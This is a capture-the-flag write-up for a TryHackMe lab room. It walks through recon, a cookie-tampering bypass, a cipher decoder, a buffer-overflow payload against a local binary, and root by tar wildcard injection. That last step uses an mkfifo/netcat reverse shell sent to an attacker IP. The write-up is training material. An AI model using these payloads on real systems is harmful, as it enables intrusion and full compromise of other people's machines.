# Anonymous Playground – TryHackMe Write-Up

---

## 📌 Task 1: Prove Yourself

### Reconnaissance
I performed an initial port scan to identify active services:

```bash
nmap -sC -sV <TARGET_IP>
```

## Results:

Port 22: SSH

Port 80: HTTP (Web Server)

Hidden Directory Found: /zYdHuAK

## 🔍 Enumeration
Web Exploration (Port 80)
Before diving into the hidden directory, I explored the main web server and found a file named operatives.php, which contained a list of names.

## Hidden Directory: /zYdHuAKjP/
Upon visiting the /zYdHuAKjP/ directory, I was greeted with an Access Denied message. To bypass this, I used Burp Suite to inspect the traffic:

Located the cookie: Cookie: access=denied.

Modified the value to: access=granted.

Refreshed the page to reveal an encoded string.
```html
Encoded String: hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```
## 🐍 Custom Decryption Script
The hint provided was: "I'm going to write a Python script for this. 'zA' = 'a'." I wrote the following script to handle the pair-based substitution cipher:

```python
def decrypt(cipher_text):
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    # Dictionary mapping for quick lookup
    val = {char: i + 1 for i, char in enumerate(alphabet)}
    rev_val = {i + 1: char for i, char in enumerate(alphabet)}
    
    decoded = ""
    i = 0
    while i < len(cipher_text):
        pair = cipher_text[i:i+2].lower()
        
        # Handle the separator "::"
        if ":" in pair:
            decoded += ":"
            i += 1 
            continue
            
        # Logic: (char1 + char2) mod 26
        num1 = val[pair[0]]
        num2 = val[pair[1]]
        
        total = (num1 + num2 - 1) % 26 + 1
        decoded += rev_val[total]
        i += 2 
        
    return decoded

cipher = "hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
print(f"Decoded Credentials: {decrypt(cipher)}")
```
```html
Decoded Strings: REDACTED::REDACTED
```
## 🛡️ Privilege Escalation: Binary Exploitation
Finding the Vulnerability
After logging in as magna via SSH, I analyzed a binary named hacktheworld. I discovered it was vulnerable to a Buffer Overflow. By fuzzing the input, I determined the application crashes at 72 bytes.

Finding the "Win" Function
Using readelf, I found a function named call_bash at memory address 0x400657.
```bash
readelf -s hacktheworld | grep -i "call_bash"
```
## Execution
I used a subshell (python...; cat) to keep stdin open after the overflow, allowing me to interact with the shell once execution was redirected.
```bash
(python -c 'print "A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
# Output: [Message corrupted]...Well...done.
whoami
# Result: spooky
```
## 🚀 Root Escalation: Wildcard Injection
I checked the system-wide crontab:
```bash
cat /etc/crontab
# Found: */1 * * * * root cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```
The use of the wildcard (*) in the /home/spooky directory is vulnerable to Tar Wildcard Injection. Since tar is executed by root, I can pass command-line arguments via filenames.
## Steps to Root:
1. Create a Reverse Shell Script:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 9001 >/tmp/f" > shell.sh
```
2. Inject Tar Flags:
```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
3. Catch the Shell:
I set up a Netcat listener (nc -lvnp 9001). Within one minute, the cron job executed, triggered the checkpoint action, and granted me a root shell.
```bash
cat /root/root.txt
```
